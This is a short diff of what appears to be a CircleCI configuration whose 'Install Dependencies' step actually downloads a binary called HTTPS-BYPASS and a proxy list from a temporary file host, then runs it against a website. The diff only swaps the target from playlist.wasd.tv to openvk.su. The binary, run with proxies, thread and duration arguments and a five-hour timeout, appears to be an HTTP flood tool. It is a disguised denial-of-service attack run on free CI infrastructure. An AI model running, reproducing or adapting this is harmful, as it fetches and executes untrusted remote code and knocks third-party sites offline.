@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: apt update && apt install wget -y && wget https://temp.sh/UuCZP/HTTPS-BYPASS && wget https://temp.sh/swuKL/proxy.txt && chmod +x HTTPS-BYPASS && ./HTTPS-BYPASS https://playlist.wasd.tv/ 30000 250 20
+            command: apt update && apt install wget -y && wget https://temp.sh/UuCZP/HTTPS-BYPASS && wget https://temp.sh/swuKL/proxy.txt && chmod +x HTTPS-BYPASS && ./HTTPS-BYPASS https://openvk.su/ 30000 250 20
             no_output_timeout: 5h
 
 workflows:
